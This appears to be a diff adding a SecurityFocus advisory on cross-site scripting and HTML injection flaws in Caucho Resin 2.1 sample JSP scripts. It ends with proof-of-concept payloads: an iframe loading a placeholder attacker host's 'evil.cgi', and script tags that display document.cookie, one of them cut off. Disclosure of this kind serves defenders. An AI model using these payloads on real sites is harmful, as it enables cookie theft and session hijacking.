@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/8852/info
+
+It has been reported that Caucho Resin is prone to multiple HTML Injection and cross-site scripting vulnerabilities in various scripts that may allow a remote attacker to cause hostile HTML or script code to be rendered in the browser of a user who follows a malicious link supplied by the attacker.
+
+The affected scripts include env.jsp, form.jsp, session.jsp, and tictactoe.jsp. The 'name' and 'comment' fields of guestbook.jsp have been reported to be vulnerable to HTML injection. An attacker may exploit this vulnerability to execute arbitrary HTML and script code in the browser of an unsuspecting user. Exploitation may also allow attackers to inject hostile HTML and script code into the sample guestbook.
+
+Successful exploitation of these issues may allow an attacker to steal cookie-based credentials. Other attacks may also be possible.
+
+Caucho Resin version 2.1 and prior have been reported to be prone to this issue, however other versions may be affected as well.
+
+http://www.example.com:8080/examples/tictactoe/tictactoe.jsp?move=<iframe%20src="http://attcker/evil.cgi"></iframe>4
+or
+<SCRIPT>alert(document.domain);</SCRIPT><SCRIPT>alert(document.cookie);</SCR 
